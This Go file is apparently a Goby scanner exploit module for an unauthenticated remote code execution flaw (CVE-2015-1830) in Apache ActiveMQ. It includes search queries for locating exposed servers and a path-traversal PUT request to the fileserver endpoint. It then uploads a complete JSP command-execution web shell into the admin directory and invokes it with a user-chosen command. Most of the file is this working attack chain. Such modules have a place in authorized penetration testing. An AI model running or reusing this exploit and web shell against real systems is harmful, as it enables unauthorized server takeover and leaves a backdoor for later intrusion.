package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Apache ActiveMQ fileserver file Unauthenticated RCE (CVE-2015-1830)",
    "Description": "<p>Apache ActiveMQ is the most popular open source, multi-protocol, Java-based message broker. </p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Apache-ActiveMQ",
    "Homepage": "https://activemq.apache.org",
    "DisclosureDate": "2021-10-25",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "(((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\")",
    "GobyQuery": "(((title=\"Apache ActiveMQ\" || (port=\"8161\" && header=\"Server: Jetty\") || header=\"realm=\\\"ActiveMQRealm\") && header!=\"couchdb\" && header!=\"drupal\" && body!=\"Server: couchdb\") || (banner=\"server:ActiveMQ\" || banner=\"Magic:ActiveMQ\" || banner=\"realm=\\\"ActiveMQRealm\") || banner=\"Apache ActiveMQ\")",
    "Level": "3",
    "Impact": "p&gt;Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://activemq.apache.org/.\">https://activemq.apache.org/.</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache ActiveMQ 系统 fileserver 文件 未授权命令执行 (CVE-2015-1830)",
            "Product": "Apache-ActiveMQ",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ],
            "Description": "<p>Apache ActiveMQ是最流行的开源、多协议、基于Java的消息代理。</p><p>攻击者可以利用此漏洞在服务器端任意执行代码、写入后门、获取服务器权限，然后控制整个web服务器。</p>",
            "Impact": "<p>攻击者可以利用此漏洞在服务器端任意执行代码、写入后门、获取服务器权限，然后控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://activemq.apache.org/.\">https://activemq.apache.org/.</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>"
        },
        "EN": {
            "Name": "Apache ActiveMQ fileserver file Unauthenticated RCE (CVE-2015-1830)",
            "Product": "Apache-ActiveMQ",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ],
            "Description": "<p>Apache ActiveMQ is the most popular open source, multi-protocol, Java-based message broker. </p><p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://activemq.apache.org/.\">https://activemq.apache.org/.</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>"
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "PUT",
                "uri": "/fileserver/sex../../..\\\\\\\\admin/qetyu.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "adgjloure"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "204",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/qetyu.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "adgjloure",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "PUT",
                "uri": "/fileserver/sex../../..\\\\\\\\admin/qazwsx.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": "<%@ page import=\"java.util.*,java.io.*\"%>\n<%\n//\n// JSP_KIT\n//\n// cmd.jsp = Command Execution (unix)\n//\n// by: Unknown\n// modified: 27/06/2003\n//\n%>\n<HTML><BODY>\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n<INPUT TYPE=\"text\" NAME=\"cmd\">\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\n</FORM>\n<pre>\n<%\nif (request.getParameter(\"cmd\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\n        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n                out.println(disr);\n                disr = dis.readLine();\n                }\n        }\n%>\n</pre>\n</BODY></HTML>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/qazwsx.jsp?cmd={{{cmd}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)<BR>(.*?)</pre>"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2015-1830"
    ],
    "CNNVD": [
        "CNNVD-201508-430"
    ],
    "CNVD": [
        "CNVD-2015-05451"
    ],
    "CVSSScore": "9.6",
    "AttackSurfaces": {
        "Application": [
            "Apache-ActiveMQ"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10176"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}